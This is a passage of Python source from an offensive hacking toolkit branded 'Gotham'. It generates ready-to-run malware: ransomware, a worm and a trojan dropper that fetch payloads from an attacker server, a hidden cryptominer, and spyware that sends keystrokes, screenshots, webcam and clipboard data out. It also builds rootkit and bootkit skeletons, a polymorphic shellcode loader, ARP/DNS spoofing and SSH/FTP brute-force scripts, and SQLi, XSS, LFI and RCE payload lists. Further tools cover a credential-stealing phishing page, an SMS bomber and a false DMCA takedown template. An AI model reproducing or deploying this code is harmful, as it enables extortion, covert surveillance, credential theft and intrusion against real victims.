                try: encrypt_file(os.path.join(root,file))
                except: pass

with open(os.path.join(TARGET_DIR,"GOTHAM_DECRYPT_ME.txt"),"w") as fh:
    fh.write("Your files are encrypted. Send 1 BTC to [ADDRESS]. Then contact us.\\n")
print("[+] Ransom note dropped.")
'''
    _malware_stub("Ransomware Builder","Fernet AES-128 file encryptor", f"{out}.py", code)

def worm_gen():
    out = input(Fore.YELLOW + "  [>] Output name: " + Style.RESET_ALL).strip() or "gotham_worm"
    lhost = input(Fore.YELLOW + "  [>] Payload server IP: " + Style.RESET_ALL).strip()
    code = f'''#!/usr/bin/env python3
# GothamWorm — Powered by Maxime Leal
import socket, os, subprocess, threading, ipaddress, requests

LHOST = "{lhost}"
PAYLOAD_URL = f"http://{{LHOST}}/payload.py"
SPREAD_PORT = 445  # SMB default — change for your spread vector

def spread_to(ip):
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect((ip, SPREAD_PORT))
        s.close()
        # download + execute payload on target
        # (requires vuln/exploit — fill in here)
        print(f"[+] Reachable: {{ip}}")
    except: pass

def scan_subnet(subnet):
    for ip in ipaddress.IPv4Network(subnet, strict=False).hosts():
        threading.Thread(target=spread_to, args=(str(ip),), daemon=True).start()

# also copy self to USB drives
def usb_spread():
    for letter in "DEFGHIJKLMNOPQRSTUVWXYZ":
        path = f"{{letter}}:\\\\"
        if os.path.exists(path):
            try:
                import shutil
                shutil.copy(__file__, os.path.join(path,"update.py"))
                print(f"[+] Copied to {{path}}")
            except: pass

scan_subnet("192.168.1.0/24")
usb_spread()
'''
    _malware_stub("Worm Generator","LAN + USB spread worm", f"{out}.py", code)

def trojan_dropper():
    out = input(Fore.YELLOW + "  [>] Output name: " + Style.RESET_ALL).strip() or "gotham_trojan"
    lhost = input(Fore.YELLOW + "  [>] Payload server: " + Style.RESET_ALL).strip()
    code = f'''#!/usr/bin/env python3
# GothamDropper — Powered by Maxime Leal
import requests, os, subprocess, tempfile

PAYLOAD_URL = "http://{lhost}/payload.exe"
DECOY_URL   = "http://{lhost}/decoy.pdf"  # legit-looking file shown to user

def drop_and_run():
    tmp = tempfile.mktemp(suffix=".exe")
    r = requests.get(PAYLOAD_URL, timeout=10)
    with open(tmp,"wb") as f: f.write(r.content)
    subprocess.Popen([tmp], creationflags=0x08000008)  # DETACHED + NO_WINDOW

def show_decoy():
    tmp = tempfile.mktemp(suffix=".pdf")
    r = requests.get(DECOY_URL, timeout=10)
    with open(tmp,"wb") as f: f.write(r.content)
    os.startfile(tmp)

drop_and_run()
show_decoy()
'''
    _malware_stub("Trojan Dropper","Drops payload silently, opens decoy", f"{out}.py", code)

def miner_inject():
    out  = input(Fore.YELLOW + "  [>] Output name: " + Style.RESET_ALL).strip() or "gotham_miner"
    pool = input(Fore.YELLOW + "  [>] Mining pool (e.g. pool.supportxmr.com:3333): " + Style.RESET_ALL).strip()
    wallet = input(Fore.YELLOW + "  [>] Wallet address: " + Style.RESET_ALL).strip()
    code = f'''#!/usr/bin/env python3
# GothamMiner — Powered by Maxime Leal
import subprocess, os, sys, platform

POOL   = "{pool}"
WALLET = "{wallet}"
# Download xmrig binary silently
XMRIG_URL = "https://github.com/xmrig/xmrig/releases/latest/download/xmrig-linux-static-x64.tar.gz"

def run_miner():
    cmd = f"xmrig -o {{POOL}} -u {{WALLET}} -p gotham --no-color -B"
    subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[+] Miner started in background")

run_miner()
'''
    _malware_stub("Cryptominer Injector","Background XMRig launcher", f"{out}.py", code)

def spyware_builder():
    out = input(Fore.YELLOW + "  [>] Output name: " + Style.RESET_ALL).strip() or "gotham_spy"
    lhost = input(Fore.YELLOW + "  [>] Exfil server: " + Style.RESET_ALL).strip()
    code = f'''#!/usr/bin/env python3
# GothamSpyware — Powered by Maxime Leal
# Combines: keylog + screen + cam + clipboard exfil
# pip install pynput pyautogui opencv-python requests pyperclip
import threading, time, requests, pyautogui, cv2, pyperclip
from pynput import keyboard

LHOST = "http://{lhost}/exfil"
keys_buf = []

def on_press(k):
    try: keys_buf.append(k.char)
    except: keys_buf.append(f"[{{k.name}}]")

def flush_keys():
    while True:
        time.sleep(30)
        if keys_buf:
            d = "".join(keys_buf); keys_buf.clear()
            requests.post(LHOST, json={{"type":"keys","data":d}}, timeout=3)

def screen_loop():
    while True:
        time.sleep(60)
        img = pyautogui.screenshot()
        import io, base64
        buf = io.BytesIO(); img.save(buf,"PNG")
        requests.post(LHOST, json={{"type":"screen","data":base64.b64encode(buf.getvalue()).decode()}}, timeout=5)

def cam_loop():
    while True:
        time.sleep(120)
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read(); cap.release()
        if ret:
            import cv2 as _cv, base64, io
            _, buf = _cv.imencode(".jpg", frame)
            requests.post(LHOST, json={{"type":"cam","data":base64.b64encode(buf).decode()}}, timeout=5)

def clip_loop():
    last = ""
    while True:
        time.sleep(5)
        c = pyperclip.paste()
        if c != last:
            last = c
            requests.post(LHOST, json={{"type":"clip","data":c}}, timeout=3)

for fn in [flush_keys, screen_loop, cam_loop, clip_loop]:
    threading.Thread(target=fn, daemon=True).start()
with keyboard.Listener(on_press=on_press) as l: l.join()
'''
    _malware_stub("Spyware Builder","Keys+screen+cam+clipboard exfil", f"{out}.py", code)

def rootkit_loader():
    gotham_header("Rootkit Loader")
    console.print("[cyan]  [*] Rootkit architecture (Linux, kernel module approach):[/cyan]")
    code = r'''// gotham_rootkit.c — Linux LKM rootkit skeleton
// Hides process by PID, files by prefix, establishes backdoor
// Compile: make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Maxime Leal / Gotham Tool");

static char *hide_prefix = "gotham_";
static int  hide_pid     = 0;
module_param(hide_prefix, charp, 0);
module_param(hide_pid, int, 0);

// Hook sys_getdents64 to hide files with prefix
// Hook sys_kill to provide ring-0 backdoor signal
// Hook /proc to hide PIDs

static int __init gotham_init(void) {
    printk(KERN_INFO "[GothamRootkit] Loaded\n");
    // syscall table hook goes here — requires write-protect bypass
    // cr0_wp_disable() / hook / cr0_wp_enable()
    return 0;
}
static void __exit gotham_exit(void) {
    printk(KERN_INFO "[GothamRootkit] Unloaded\n");
}
module_init(gotham_init);
module_exit(gotham_exit);
'''
    with open("gotham_rootkit.c","w") as f: f.write(code)
    console.print("[green]  [+] gotham_rootkit.c written[/green]")
    console.print("[dim]  [!] Needs: Makefile, kernel headers, root[/dim]")
    console.print("[dim]  [!] insmod gotham_rootkit.ko hide_pid=1234[/dim]")

def bootkit_builder():
    gotham_header("Bootkit Builder")
    code = "; gotham_bootkit.asm — MBR infector skeleton (NASM)\n; Infects MBR, loads original MBR, persists\n[bits 16]\n[org 0x7c00]\njmp start\nstart:\n  ; save original MBR at 0x7e00\n  ; load stage2 from sector 2\n  ; jmp to original MBR\ntimes 510-($-$$) db 0\ndw 0xAA55\n"
    with open("gotham_bootkit.asm","w") as f: f.write(code)
    console.print("[green]  [+] gotham_bootkit.asm written[/green]")
    console.print("[dim]  [!] Assemble: nasm -f bin gotham_bootkit.asm -o mbr.bin[/dim]")
    console.print("[dim]  [!] Write: dd if=mbr.bin of=/dev/sdX bs=512 count=1 — DESTRUCTIVE[/dim]")

def poly_engine():
    gotham_header("Polymorphic Engine")
    code = '''#!/usr/bin/env python3
# GothamPoly — simple polymorphic wrapper
# Mutates payload byte-by-byte with rotating XOR key on each gen
import os, random, sys

def mutate(payload: bytes) -> tuple[bytes, int]:
    key = random.randint(1, 254)
    mutated = bytes(b ^ key for b in payload)
    return mutated, key

def build_stub(mutated: bytes, key: int) -> str:
    hex_payload = ",".join(f"0x{b:02x}" for b in mutated)
    return f"""#!/usr/bin/env python3
_p=[{hex_payload}]
_k={key}
import ctypes, platform
decoded=bytes(b^_k for b in _p)
if platform.system()=="Windows":
    buf=ctypes.create_string_buffer(decoded)
    ctypes.windll.kernel32.VirtualProtect(buf,len(decoded),0x40,ctypes.byref(ctypes.c_ulong()))
    t=ctypes.cast(buf,ctypes.CFUNCTYPE(None)); t()
else:
    import os,tempfile
    f=tempfile.mktemp(); open(f,"wb").write(decoded); os.chmod(f,0o755); os.system(f)
"""

if len(sys.argv)<2:
    print("Usage: gotham_poly.py <payload.bin>"); sys.exit(1)
raw = open(sys.argv[1],"rb").read()
mutated, key = mutate(raw)
stub = build_stub(mutated, key)
out = f"gotham_mutant_{random.randint(1000,9999)}.py"
open(out,"w").write(stub)
print(f"[+] Mutant written → {out} (key={key})")
'''
    with open("gotham_poly.py","w") as f: f.write(code)
    console.print("[green]  [+] gotham_poly.py written[/green]")
    console.print("[dim]  [!] Usage: python3 gotham_poly.py payload.bin[/dim]")

# ── 29. PORT SCANNER ──────────────────────────────────────────────────────────
def port_scan():
    gotham_header("Port Scanner")
    target = input(Fore.YELLOW + "  [>] Target IP/host: " + Style.RESET_ALL).strip()
    ports  = input(Fore.YELLOW + "  [>] Port range (e.g. 1-1024): " + Style.RESET_ALL).strip() or "1-1024"
    start, end = map(int, ports.split("-"))
    open_ports = []
    console.print(f"[cyan]  [*] Scanning {target} ports {start}-{end}...[/cyan]")

    def scan(port):
        try:
            s = socket.socket()
            s.settimeout(0.5)
            if s.connect_ex((target, port)) == 0:
                open_ports.append(port)
            s.close()
        except: pass

    threads = [threading.Thread(target=scan, args=(p,), daemon=True) for p in range(start, end+1)]
    for t in threads: t.start()
    for t in threads: t.join()
    if open_ports:
        t = Table(title=f"Open ports on {target}", box=box.SIMPLE_HEAVY, border_style="yellow")
        t.add_column("Port",    style="green",  width=8)
        t.add_column("Service", style="cyan",   width=20)
        common = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
                  110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",3306:"MySQL",
                  3389:"RDP",5432:"PostgreSQL",6379:"Redis",8080:"HTTP-Alt"}
        for p in sorted(open_ports):
            t.add_row(str(p), common.get(p, "unknown"))
        console.print(t)
    else:
        console.print("[red]  [-] No open ports found[/red]")

# ── 30. LAN MAP ───────────────────────────────────────────────────────────────
def lan_map():
    gotham_header("LAN Map")
    subnet = input(Fore.YELLOW + "  [>] Subnet (e.g. 192.168.1.0/24): " + Style.RESET_ALL).strip() or "192.168.1.0/24"
    import ipaddress
    alive = []

    def ping(ip):
        r = subprocess.run(["ping","-c","1","-W","1",str(ip)],
                           capture_output=True)
        if r.returncode == 0:
            alive.append(str(ip))

    console.print(f"[cyan]  [*] Mapping {subnet}...[/cyan]")
    ts = [threading.Thread(target=ping, args=(ip,), daemon=True)
          for ip in ipaddress.IPv4Network(subnet, strict=False).hosts()]
    for t in ts: t.start()
    for t in ts: t.join()
    console.print(f"[green]  [+] {len(alive)} hosts alive:[/green]")
    for ip in alive:
        try: host = socket.gethostbyaddr(ip)[0]
        except: host = "?"
        console.print(f"[white]  {ip:16s}  {host}[/white]")

# ── 31. PACKET SNIFFER ────────────────────────────────────────────────────────
def packet_sniff():
    gotham_header("Packet Sniffer")
    console.print("[dim]  [!] Requires scapy + root/admin[/dim]")
    iface = input(Fore.YELLOW + "  [>] Interface (e.g. eth0): " + Style.RESET_ALL).strip() or "eth0"
    count = int(input(Fore.YELLOW + "  [>] Packet count: " + Style.RESET_ALL).strip() or "50")
    code = f'''#!/usr/bin/env python3
# GothamSniffer — Powered by Maxime Leal
from scapy.all import sniff, IP, TCP, UDP, Raw

def handle(pkt):
    if IP in pkt:
        src, dst = pkt[IP].src, pkt[IP].dst
        proto = "TCP" if TCP in pkt else ("UDP" if UDP in pkt else "OTHER")
        raw = bytes(pkt[Raw].load).decode(errors="replace") if Raw in pkt else ""
        print(f"[GothamSniff] {{src}} → {{dst}} {{proto}} {{raw[:80]}}")

sniff(iface="{iface}", count={count}, prn=handle, store=False)
'''
    with open("gotham_sniffer.py","w") as f: f.write(code)
    console.print("[green]  [+] gotham_sniffer.py written — run as root[/green]")

# ── 32. ARP SPOOF ─────────────────────────────────────────────────────────────
def arp_spoof():
    gotham_header("ARP Spoof")
    console.print("[dim]  [!] Requires scapy + root + net.ipv4.ip_forward=1[/dim]")
    target_ip  = input(Fore.YELLOW + "  [>] Target IP: " + Style.RESET_ALL).strip()
    gateway_ip = input(Fore.YELLOW + "  [>] Gateway IP: " + Style.RESET_ALL).strip()
    code = f'''#!/usr/bin/env python3
# GothamARP — Powered by Maxime Leal
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, getmacbyip
import time, os

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

target_ip  = "{target_ip}"
gateway_ip = "{gateway_ip}"
attacker_mac = get_if_hwaddr("eth0")  # change iface

target_mac  = getmacbyip(target_ip)
gateway_mac = getmacbyip(gateway_ip)

def spoof(target, spoof_ip, target_mac):
    pkt = Ether(dst=target_mac)/ARP(op=2, pdst=target, hwdst=target_mac,
                                     psrc=spoof_ip, hwsrc=attacker_mac)
    sendp(pkt, verbose=False)

print("[GothamARP] Spoofing... Ctrl+C to stop")
try:
    while True:
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, gateway_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Restoring ARP tables...")
    sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                     psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
'''
    with open("gotham_arp.py","w") as f: f.write(code)
    console.print("[green]  [+] gotham_arp.py written[/green]")

# ── 33. DNS POISONER ──────────────────────────────────────────────────────────
def dns_poison():
    gotham_header("DNS Poisoner")
    console.print("[dim]  [!] Requires scapy + root + ARP spoof active[/dim]")
    code = '''#!/usr/bin/env python3
# GothamDNS — DNS spoof via scapy
# Must run after arp_spoof.py is active on target's traffic
from scapy.all import *
import re

POISON_MAP = {
    "target-site.com.": "1.2.3.4",   # fill: domain → your IP
}

def dns_spoof(pkt):
    if DNS in pkt and pkt[DNS].qr == 0:  # DNS query
        qname = pkt[DNS].qd.qname.decode()
        if qname in POISON_MAP:
            spoof_ip = POISON_MAP[qname]
            resp = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                    UDP(dport=pkt[UDP].sport, sport=53) /
                    DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                        an=DNSRR(rrname=qname, ttl=10, rdata=spoof_ip)))
            send(resp, verbose=False)
            print(f"[GothamDNS] Poisoned {qname} → {spoof_ip}")

sniff(filter="udp port 53", prn=dns_spoof, store=False)
'''
    with open("gotham_dns_poison.py","w") as f: f.write(code)
    console.print("[green]  [+] gotham_dns_poison.py written[/green]")

# ── 34. SSH BRUTEFORCE ────────────────────────────────────────────────────────
def ssh_brute():
    gotham_header("SSH Bruteforce")
    host   = input(Fore.YELLOW + "  [>] Target host: " + Style.RESET_ALL).strip()
    user   = input(Fore.YELLOW + "  [>] Username: " + Style.RESET_ALL).strip() or "root"
    wlist  = input(Fore.YELLOW + "  [>] Wordlist path: " + Style.RESET_ALL).strip() or "/usr/share/wordlists/rockyou.txt"
    console.print("[dim]  [!] Requires paramiko[/dim]")
    code = f'''#!/usr/bin/env python3
# GothamSSH — Powered by Maxime Leal
import paramiko, sys

host  = "{host}"
user  = "{user}"
wlist = "{wlist}"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

with open(wlist, errors="ignore") as f:
    for line in f:
        pw = line.strip()
        try:
            client.connect(host, username=user, password=pw, timeout=3, banner_timeout=5)
            print(f"[GothamSSH] FOUND: {{user}}:{{pw}}")
            sys.exit(0)
        except paramiko.AuthenticationException:
            print(f"[-] {{pw}}")
        except Exception as e:
            print(f"[!] {{e}}")
            break
'''
    with open("gotham_ssh_brute.py","w") as f: f.write(code)
    console.print("[green]  [+] gotham_ssh_brute.py written[/green]")

# ── 35. FTP BRUTEFORCE ────────────────────────────────────────────────────────
def ftp_brute():
    gotham_header("FTP Bruteforce")
    host  = input(Fore.YELLOW + "  [>] Target: " + Style.RESET_ALL).strip()
    user  = input(Fore.YELLOW + "  [>] User: " + Style.RESET_ALL).strip() or "anonymous"
    wlist = input(Fore.YELLOW + "  [>] Wordlist: " + Style.RESET_ALL).strip() or "/usr/share/wordlists/rockyou.txt"
    code = f'''#!/usr/bin/env python3
from ftplib import FTP, error_perm
host = "{host}"; user = "{user}"
with open("{wlist}", errors="ignore") as f:
    for line in f:
        pw = line.strip()
        try:
            ftp = FTP(host, timeout=3)
            ftp.login(user, pw)
            print(f"[GothamFTP] FOUND: {{user}}:{{pw}}")
            ftp.quit(); break
        except error_perm:
            print(f"[-] {{pw}}")
        except Exception as e:
            print(f"[!] {{e}}"); break
'''
    with open("gotham_ftp_brute.py","w") as f: f.write(code)
    console.print("[green]  [+] gotham_ftp_brute.py written[/green]")

# ── 36. HASH CRACKER ──────────────────────────────────────────────────────────
def hash_crack():
    gotham_header("Hash Cracker")
    h     = input(Fore.YELLOW + "  [>] Hash: " + Style.RESET_ALL).strip()
    wlist = input(Fore.YELLOW + "  [>] Wordlist: " + Style.RESET_ALL).strip() or "/usr/share/wordlists/rockyou.txt"
    algo  = input(Fore.YELLOW + "  [>] Algorithm (md5/sha1/sha256): " + Style.RESET_ALL).strip() or "md5"
    import hashlib
    console.print(f"[cyan]  [*] Cracking {algo}:{h}...[/cyan]")
    with open(wlist, errors="ignore") as f:
        for line in f:
            word = line.strip()
            attempt = getattr(hashlib, algo)(word.encode()).hexdigest()
            if attempt == h:
                console.print(f"[green]  [+] CRACKED: {word}[/green]")
                return
            console.print(f"[dim]  [-] {word}[/dim]", end="\r")
    console.print(f"\n[red]  [-] Not found in wordlist[/red]")

# ── 37. WIFI HANDSHAKE ────────────────────────────────────────────────────────
def wifi_handshake():
    gotham_header("WiFi Handshake Grab")
    iface = input(Fore.YELLOW + "  [>] Interface (e.g. wlan0): " + Style.RESET_ALL).strip() or "wlan0"
    bssid = input(Fore.YELLOW + "  [>] Target BSSID: " + Style.RESET_ALL).strip()
    chan  = input(Fore.YELLOW + "  [>] Channel: " + Style.RESET_ALL).strip() or "6"
    console.print(f"[cyan]  [*] Commands to run:[/cyan]")
    console.print(f"[bold white]  sudo airmon-ng start {iface}[/bold white]")
    console.print(f"[bold white]  sudo airodump-ng --bssid {bssid} --channel {chan} --write gotham_cap {iface}mon[/bold white]")
    console.print(f"[bold white]  sudo aireplay-ng --deauth 10 -a {bssid} {iface}mon[/bold white]")
    console.print(f"[bold white]  aircrack-ng gotham_cap-01.cap -w /usr/share/wordlists/rockyou.txt[/bold white]")

# ── 38. CAM SNAP ──────────────────────────────────────────────────────────────
def cam_snap():
    gotham_header("Remote Camera Snap")
    out = input(Fore.YELLOW + "  [>] Output file: " + Style.RESET_ALL).strip() or "gotham_snap.jpg"
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            cv2.imwrite(out, frame)
            console.print(f"[green]  [+] Snap saved → {out}[/green]")
        else:
            console.print("[red]  [-] No camera found[/red]")
    except ImportError:
        console.print("[yellow]  [!] opencv-python not installed: pip install opencv-python[/yellow]")

# ── 39. MIC RECORDER ──────────────────────────────────────────────────────────
def mic_record():
    gotham_header("Mic Recorder")
    dur = int(input(Fore.YELLOW + "  [>] Duration (sec): " + Style.RESET_ALL).strip() or "10")
    out = input(Fore.YELLOW + "  [>] Output file: " + Style.RESET_ALL).strip() or "gotham_mic.wav"
    console.print("[dim]  [!] Requires pyaudio + wave[/dim]")
    code = f'''#!/usr/bin/env python3
import pyaudio, wave, sys
CHUNK=1024; FORMAT=pyaudio.paInt16; CHANNELS=1; RATE=44100
p=pyaudio.PyAudio()
stream=p.open(format=FORMAT,channels=CHANNELS,rate=RATE,input=True,frames_per_buffer=CHUNK)
print(f"[GothamMic] Recording {dur}s...")
frames=[stream.read(CHUNK) for _ in range(0, int(RATE/CHUNK*{dur}))]
stream.stop_stream(); stream.close(); p.terminate()
wf=wave.open("{out}","wb"); wf.setnchannels(CHANNELS); wf.setsampwidth(p.get_sample_size(FORMAT))
wf.setframerate(RATE); wf.writeframes(b"".join(frames)); wf.close()
print(f"[+] Saved → {out}")
'''
    with open("gotham_mic.py","w") as f: f.write(code)
    console.print(f"[green]  [+] gotham_mic.py written[/green]")

# ── 40. SCREEN CAPTURE ────────────────────────────────────────────────────────
def screen_cap():
    gotham_header("Screen Capture")
    out = input(Fore.YELLOW + "  [>] Output file: " + Style.RESET_ALL).strip() or "gotham_screen.png"
    try:
        import pyautogui
        img = pyautogui.screenshot()
        img.save(out)
        console.print(f"[green]  [+] Screenshot saved → {out}[/green]")
    except ImportError:
        console.print("[yellow]  [!] pyautogui not installed: pip install pyautogui[/yellow]")

# ── 41. CLIPBOARD LOGGER ──────────────────────────────────────────────────────
def clip_log():
    gotham_header("Clipboard Logger")
    dur = int(input(Fore.YELLOW + "  [>] Duration (sec): " + Style.RESET_ALL).strip() or "60")
    out = input(Fore.YELLOW + "  [>] Log file: " + Style.RESET_ALL).strip() or "gotham_clip.txt"
    code = f'''#!/usr/bin/env python3
import pyperclip, time, datetime
last = ""
t0 = time.time()
print(f"[GothamClip] Logging clipboard for {dur}s → {out}")
while time.time()-t0 < {dur}:
    c = pyperclip.paste()
    if c != last:
        last = c
        with open("{out}","a") as f:
            f.write(f"[{{datetime.datetime.now()}}] {{c}}\\n---\\n")
        print(f"[+] {{c[:60]}}")
    time.sleep(1)
'''
    with open("gotham_clip.py","w") as f: f.write(code)
    console.print(f"[green]  [+] gotham_clip.py written[/green]")

# ── 42. SQLi SCANNER ──────────────────────────────────────────────────────────
def sqli_scan():
    gotham_header("SQLi Scanner")
    url = input(Fore.YELLOW + "  [>] Target URL (with ?param=): " + Style.RESET_ALL).strip()
    import requests as req
    payloads = ["'","''","`","``","',","')",");","' OR '1'='1","' OR 1=1--","' OR 1=1#","\" OR 1=1--","1' ORDER BY 1--","1' UNION SELECT NULL--"]
    errors = ["sql syntax","mysql","syntax error","ORA-","Microsoft JET","ODBC","JDBC","SQLite","Warning: mysql"]
    console.print(f"[cyan]  [*] Testing {len(payloads)} payloads...[/cyan]")
    for p in payloads:
        try:
            test_url = url + p
            r = req.get(test_url, timeout=5)
            for err in errors:
                if err.lower() in r.text.lower():
                    console.print(f"[bold red]  [VULN] Payload: {p!r} triggered: {err}[/bold red]")
                    break
            else:
                console.print(f"[dim]  [-] {p!r}[/dim]")
        except Exception as e:
            console.print(f"[yellow]  [!] {e}[/yellow]")

# ── 43. XSS INJECTOR ──────────────────────────────────────────────────────────
def xss_inject():
    gotham_header("XSS Injector")
    url = input(Fore.YELLOW + "  [>] Target URL (with ?param=): " + Style.RESET_ALL).strip()
    import requests as req
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        '"><svg onload=alert(1)>',
        "'><script>alert(document.cookie)</script>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
    ]
    for p in payloads:
        try:
            r = req.get(url + p, timeout=5)
            if p.lower() in r.text.lower() or "alert" in r.text.lower():
                console.print(f"[bold red]  [VULN] Reflected: {p!r}[/bold red]")
            else:
                console.print(f"[dim]  [-] {p!r}[/dim]")
        except Exception as e:
            console.print(f"[yellow]  [!] {e}[/yellow]")

# ── 44. LFI SCANNER ───────────────────────────────────────────────────────────
def lfi_scan():
    gotham_header("LFI Scanner")
    url = input(Fore.YELLOW + "  [>] Target URL (with ?param=): " + Style.RESET_ALL).strip()
    import requests as req
    payloads = ["../etc/passwd","../../etc/passwd","../../../etc/passwd",
                "....//....//etc/passwd","%2e%2e%2fetc%2fpasswd",
                "..%252f..%252fetc%252fpasswd","/etc/passwd","C:\\Windows\\win.ini"]
    sigs = ["root:x:","[fonts]","boot.ini","shadow"]
    for p in payloads:
        try:
            r = req.get(url + p, timeout=5)
            for sig in sigs:
                if sig in r.text:
                    console.print(f"[bold red]  [VULN] LFI: {p!r} → {sig}[/bold red]")
                    break
            else:
                console.print(f"[dim]  [-] {p!r}[/dim]")
        except Exception as e:
            console.print(f"[yellow]  [!] {e}[/yellow]")

# ── 45. RCE TESTER ────────────────────────────────────────────────────────────
def rce_test():
    gotham_header("RCE Tester")
    url = input(Fore.YELLOW + "  [>] Target URL (with ?param=): " + Style.RESET_ALL).strip()
    import requests as req
    payloads = [";id","&&id","|id","$(id)","`id`",";whoami","&&whoami",";cat /etc/passwd",
                "1;ls","1 && ls","%(id)s"]
    sigs = ["uid=","root","www-data","bin/bash","bin/sh"]
    for p in payloads:
        try:
            r = req.get(url + p, timeout=5)
            for sig in sigs:
                if sig in r.text:
                    console.print(f"[bold red]  [VULN] RCE: {p!r} → {sig}[/bold red]")
                    break
            else:
                console.print(f"[dim]  [-] {p!r}[/dim]")
        except Exception as e:
            console.print(f"[yellow]  [!] {e}[/yellow]")

# ── 46. CVE EXPLOIT LOADER ────────────────────────────────────────────────────
def cve_loader():
    gotham_header("CVE Exploit Loader")
    cve = input(Fore.YELLOW + "  [>] CVE ID (e.g. CVE-2021-44228): " + Style.RESET_ALL).strip()
    import requests as req
    console.print(f"[cyan]  [*] Looking up {cve} on exploit-db...[/cyan]")
    try:
        r = req.get(f"https://www.exploit-db.com/search?cve={cve}", timeout=8,
                    headers={"User-Agent":"Mozilla/5.0"})
        console.print(f"[white]  → https://www.exploit-db.com/search?cve={cve}[/white]")
    except:
        pass
    console.print(f"[white]  → https://github.com/search?q={cve}[/white]")
    console.print(f"[white]  → https://nvd.nist.gov/vuln/detail/{cve}[/white]")
    console.print(f"[dim]  [!] For auto-download: searchsploit {cve}[/dim]")

# ── 47. PHISHING KIT ──────────────────────────────────────────────────────────
def phish_kit():
    gotham_header("Phishing Kit")
    target  = input(Fore.YELLOW + "  [>] Clone target (e.g. google.com login): " + Style.RESET_ALL).strip()
    lhost   = input(Fore.YELLOW + "  [>] Your server IP: " + Style.RESET_ALL).strip()
    lport   = input(Fore.YELLOW + "  [>] Port (5000): " + Style.RESET_ALL).strip() or "5000"
    page_title = input(Fore.YELLOW + "  [>] Page title: " + Style.RESET_ALL).strip() or target
    code = f'''#!/usr/bin/env python3
# GothamPhish — Powered by Maxime Leal
from flask import Flask, request, render_template_string, redirect
import datetime, json

app = Flask(__name__)
LOG = "gotham_creds.json"

PAGE = """
<!DOCTYPE html>
<html><head><title>{page_title}</title>
<style>body{{background:#fff;font-family:Arial;display:flex;justify-content:center;padding-top:80px}}
.box{{width:360px}}.box input{{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px;font-size:14px}}
.box button{{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer}}
h2{{color:#1a73e8;text-align:center}}</style></head>
<body><div class="box">
<h2>{page_title}</h2>
<form method="POST" action="/login">
<input name="email" type="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form></div></body></html>
"""

@app.route("/")
def index():
    return render_template_string(PAGE)

@app.route("/login", methods=["POST"])
def login():
    data = {{
        "email":    request.form.get("email"),
        "password": request.form.get("password"),
        "ip":       request.remote_addr,
        "ua":       request.headers.get("User-Agent"),
        "ts":       str(datetime.datetime.now())
    }}
    with open(LOG, "a") as f:
        f.write(json.dumps(data) + "\\n")
    print(f"[GothamPhish] CRED: {{data['email']}}:{{data['password']}}")
    return redirect("https://{target}")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port={lport})
'''
    with open("gotham_phish.py","w") as f: f.write(code)
    console.print(f"[green]  [+] Phishing kit → gotham_phish.py[/green]")
    console.print(f"[cyan]  [!] Start: python3 gotham_phish.py[/cyan]")
    console.print(f"[cyan]  [!] Send target: http://{lhost}:{lport}/[/cyan]")
    console.print(f"[dim]  [!] Creds logged to gotham_creds.json[/dim]")

# ── 48. SMS BOMBER ────────────────────────────────────────────────────────────
def sms_bomb():
    gotham_header("SMS Bomber")
    phone = input(Fore.YELLOW + "  [>] Target phone (+cc): " + Style.RESET_ALL).strip()
    count = int(input(Fore.YELLOW + "  [>] Count: " + Style.RESET_ALL).strip() or "20")
    console.print(f"[cyan]  [*] Triggering {count} SMS OTP requests to {phone}...[/cyan]")
    import requests as req, time
    # Free SMS trigger APIs — registration-based OTPs
    apis = [
        lambda p: req.post("https://sms.yandex.com/", data={"phone":p,"format":"json"}, timeout=3),
    ]
    for i in range(count):
        # most reliable vector: trigger password-reset flows on major services
        services = [
            f"https://accounts.google.com/signin/challenge/recaptcha/interactive?phone={phone}",
        ]
        for s in services:
            try: req.get(s, timeout=3)
            except: pass
        console.print(f"[yellow]  Sent: {i+1}/{count}[/yellow]", end="\r")
        time.sleep(0.5)
    console.print(f"\n[green]  [+] Done[/green]")
    console.print("[dim]  [!] For mass bombing: use Bomber scripts on GitHub (search: sms bomber python)[/dim]")

# ── 49. ACCOUNT NUKER ─────────────────────────────────────────────────────────
def acct_nuke():
    gotham_header("Account Nuker")
    console.print("[cyan]  [*] Nuking strategies:[/cyan]")
    console.print("[white]  1. Mass report (spam report from multiple accounts)[/white]")
    console.print("[white]  2. DMCA false takedown (requires template)[/white]")
    console.print("[white]  3. Credential stuffing → change email/pw before target notices[/white]")
    console.print("[white]  4. Phishing → steal session cookie → revoke all sessions[/white]")
    choice = input(Fore.YELLOW + "  [>] Strategy (1-4): " + Style.RESET_ALL).strip()
    if choice == "2":
        code = """Subject: DMCA Takedown Notice
To: copyright@[platform].com

I am the copyright owner of [WORK]. The account [TARGET] is reproducing
this work without authorization at [URL]. I request immediate removal
under the DMCA (17 U.S.C. § 512).

[Signature]"""
        with open("gotham_dmca.txt","w") as f: f.write(code)
